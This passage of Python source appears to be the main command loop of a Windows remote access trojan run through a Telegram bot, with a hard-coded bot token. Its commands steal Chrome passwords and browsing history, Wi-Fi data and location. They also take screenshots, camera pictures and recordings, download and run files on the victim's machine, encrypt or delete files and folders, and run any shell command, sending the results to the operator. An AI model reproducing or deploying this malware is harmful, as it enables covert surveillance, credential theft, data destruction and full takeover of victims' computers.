    p = subprocess.Popen("chdir C:\\proccess\\ && mkdir neercs", shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
    p = subprocess.Popen("chdir C:\\proccess\\ && mkdir wiinf", shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
    p = subprocess.Popen("chdir C:\\proccess\\ && mkdir tuop", shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
    
    send_message('ip: '+ip_in[0][7:]+" is conect")
    
    
    try:
        time.sleep(0.6)
        send_message("the curent working directory is:\n"+dir_resaoult+'>')
    except:
        send_message("eror to find current working directory")
    
    while True:
        try:
            base_url='https://api.telegram.org/bot5330049993:AAHZALg3qBzRxExSTTRiCVoMpkQH8GTGGho/getUpdates?offset='+offset
            resp = requests.get(base_url)
            messages=resp.text
            messages=messages.replace("update_id","^^^@^@").split('^^^')
            messages=messages[-1]
            messages=str(messages)

            offset=''
            for i in range(len(messages)):
                if messages [i:i+3]=='@^@':
                    for n in range(i+5,100000):
                        if messages[n]!=',':
                            offset+=messages[n]
                        else:
                            break
                    break



            time.sleep(0.6)
            message_data=''
            for i in range(len(messages)):
                if messages[i:i+4] == 'text':
                    for n in range(i+7,100000000):
                        if messages[n:n+5]!='"}}]}' and messages[n:n+12]!=',"entities":':
                            message_data+=messages[n]
                        else:
                            break
                    break


            if cc!=offset:
                cc=offset
                counter+=1

                command=message_data
                if command [0]=='/':
                    command=command[1:-1]

                print(command)
                if counter > 1:
                    if  "get ip info" in command:
                        ip_information()
                        send_message(str(ip_in))


                    elif "screen shot" in command:
                        name=command[12:]
                        inside_up_crypt=0
                        screen_shot(name)
                        inside_up_crypt=1
                        Delet_files().delet_files_list('C:\\proccess\\neercs\\')


                    elif "record target" in command:
                        inside_up_crypt=0
                        name_record=''
                        time_rec=''
                        p=0
                        for i in range(len(command)):
                            if i >= 14 and command[i]!= '=':
                                name_record+=command[i]
                            elif command[i]=='=':
                                print(i)
                                for n in range(i+1,len(command)):
                                    time_rec+= command[n]
                                break
                        name_record=name_record.replace('time','')
                        time_rec=int(time_rec)
                        print(name_record)
                        print(time_rec)
                        record_target(name_record,time_rec)
                        inside_up_crypt=1
                        
                        



                    elif "get wifi info" in command:
                        wifi_info()
                        with open("C:\\proccess\\wiinf\\info.txt",'r') as file:
                            info=file.read()
                            send_message(info)
                        if "expend" in command:
                            files={'document':open('C:\\proccess\\wiinf\\expend.txt', 'rb')}
                            requests.post("https://api.telegram.org/bot"+telegram_token+"/sendDocument?chat_id="+chat_id+"&caption=expend wifi info.txt",files=files )
                        time.sleep(5)
                        file.close()
                        Delet_files().delet_files_list("C:\\proccess\\wiinf\\")
                            



                    elif "get current location" in command:
                        get_current_location()


                    elif "send file to target" in command:
                        url1=command[20:]
                        name=url1.split('/')
                        name=name[-1]
                        send_files_to_target(url1,name)

                    elif "start file on target" in command:
                        name=command[21:]
                        start_files_on_target_machine(name)


                    elif 'open camera' in command:
                        name=command[12:]
                        open_camera(name)
                    elif "captur video" in command:
                        url=command[13:]
                        upload_files(url,'C:\\proccess\\div\\'+name_video+'.mp4')
                        send_message(url+name_video+'.mp4')



                    elif "take picture" in command:
                        pname=command[13:]
                        take_picture(pname)

    

                    elif "scan process" in command:
                        Proccess().process_scan()
                    elif "search process" in command:
                        sp=command[15:]
                        Proccess().searches_process(sp)
                    elif 'kill process' in command:
                        kp=command[13:]
                        Proccess().kill_process(kp)



                    elif "get chrome history" in command:
                        up_search_ch_his=1
                        inside_up_crypt=0
                        command=command.replace('num=',"^^^#").replace("num =",'^^^#')
                        url=''
                        num=command.split("^^^#")
                        num=num[-1]
                        print(num)
                        p=''
                        for i in range(19,len(command)):
                            if '^^' not in p:
                                p+=command[i]
                        url=p.replace("^^",'')
                        url=url[:-1]
                        histoty_chrome(url,num)
                        
                    elif 'search chrome history' in command:
                        command=command.replace('val=',"^^^#").replace("val =",'^^^#')
                        command=command[22:].split("^^^#")
                        url=command[0][:-1]
                        val=command[1]
                        num='all'
                        print(url)
                        histoty_chrome(url,num)
                        time.sleep(1)
                        searsh_chrome_history(url,val)



                    elif 'get chrome passwords' in command:
                        up_chrom_pass=1
                        inside_up_crypt=0
                        chrome_password2()
                    elif 'search chrom pass' in command:
                        inside_up_crypt=0
                        up_chrom_pass=0
                        if "advance" in command:
                            Search_chrome_passwords(command[26:]).advanced_search()
                        else:
                            Search_chrome_passwords(command[18:]).search_pass()


                    
    
                    elif command[:16]=='delete file list':
                        print(command[17:])
                        Delet_files().to_send_res(command[17:])
                    elif command[:11]== 'delete file':
                        Delet_files().delet_one_file(command[12:])

                    
                                    
                    elif command[:12]== "encrypt file":
                        Crypt_my10(key).encrypt_files(command[13:])
                        inside_up_crypt=1
                    elif command [:12]== "decrypt file":
                        Crypt_my10(key).decrypt_files(command[13:])
                        inside_up_crypt=1
                    elif command[:14]=='encrypt folder' and '-s'not in command[:18]:
                        Crypt_my10(key).recursive_encrypt_files(command[15:])
                    elif command[:14]=="decrypt folder" and '-s'not in command[:18]:
                        Crypt_my10(key).recursive_decrypt_files(command[15:])
                    elif command[:17]=='encrypt folder -s':
                        Crypt_my10(key).sync_recursive_encrypt_files(command[18:])
                        
                        
                        
                    
                    
                    elif "quit.session" in command:
                        send_message("session close.")
                        Delet_files().recursive_fles_delete('C:\\proccess\\')
                        for i in p.stdout.readlines():
                            print(i)
                        break






                    else:   
                        p = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
                        data=''
                        for i in p.stdout.readlines():
                            i=str(i)
                            data+=i[2:-5]+'\n'
                        print(data)
                    
                        retval = p.wait
                        try:        
                            len_data=len(data)
                            if len_data>3100:
                                print(len_data)
                                data2=''
                                counter2=0
                                for i in range(len(data)):
                                    counter2+=1
                                    if counter2<3100:
                                        data2+=data[i]
                                    else:
                                        send_message(data2)
                                        time.sleep(0.4)
                                        counter2=0
                                        data2=''
                                if counter2 != 3098:
                                    send_message(data2)

                            else:          
                                time.sleep(0.5)
                                send_message(data)
                        except:
                            print('eror')
                            time.sleep(0.8)
                            
        except Exception as e:
            try:
                send_message(str(e))
            except:
                print(e)
            time.sleep(1)                            
        

        time.sleep(1.5)
        name=""
        url= ""
        
        


if __name__ == "__main__":
    main()
    
 
